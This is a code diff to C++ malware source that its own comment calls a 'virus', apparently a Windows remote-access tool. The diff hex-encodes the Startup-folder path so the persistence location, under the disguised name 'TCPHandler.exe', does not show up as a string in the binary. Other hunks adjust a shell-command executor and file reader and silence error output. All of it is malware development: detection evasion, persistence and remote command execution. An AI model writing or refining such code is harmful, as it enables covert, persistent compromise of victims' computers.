@@ -4,7 +4,12 @@
 #include "Utils.h"
 #include <string>
 
-std::string startUpPath = std::string(getenv("APPDATA")) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\TCPHandler.exe";
+/* hiding the path, the exe may show the string and compromise the location of the virus*/
+char additionToStartUp[256] = { 0x5c, 0x4d, 0x69, 0x63, 0x72, 0x6f, 0x73, 0x6f, 0x66, 0x74, 0x5c, 0x57, 0x69, 0x6e,
+    0x64, 0x6f, 0x77, 0x73, 0x5c, 0x53, 0x74, 0x61, 0x72, 0x74, 0x20, 0x4d, 0x65, 0x6e, 0x75, 0x5c,
+    0x50, 0x72, 0x6f, 0x67, 0x72, 0x61, 0x6d, 0x73, 0x5c, 0x53, 0x74, 0x61, 0x72, 0x74, 0x75, 0x70, 0x5c,
+    0x54, 0x43, 0x50, 0x48, 0x61, 0x6e, 0x64, 0x6c, 0x65, 0x72, 0x2e, 0x65, 0x78, 0x65, 0x0 };
+std::string startUpPath = getenv("APPDATA") + std::string(additionToStartUp);
 
 uint32_t getPrivateIP()
 {
@@ -77,6 +82,7 @@ std::string executeShell(char* cmd)
     std::string read = std::string(cmd).substr(0, 4);
     if (read == "read")
         return readFile(std::string(cmd).substr(5));
+
     std::array<char, 128> buffer;
     std::string result;
     /*i create a pointer to a "file"*/
@@ -84,7 +90,7 @@ std::string executeShell(char* cmd)
 
     /*check for errors*/
     if (!pipe)
-        throw std::runtime_error("popen() failed!");
+        return "";
     
     /*getting the output of the command*/
     while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) // I read the data from the buffer 
@@ -120,10 +126,8 @@ std::string switchDir(char* arg)
 
     /* change the directory, in case of an error we return the error*/
     if (_wchdir(subPath))
-    {
-        std::cout << "Set dir error <" << GetLastError() << ">" << std::endl;
         return "can't find directory";
-    }
+
     return subFolderPath.c_str();
 }
 
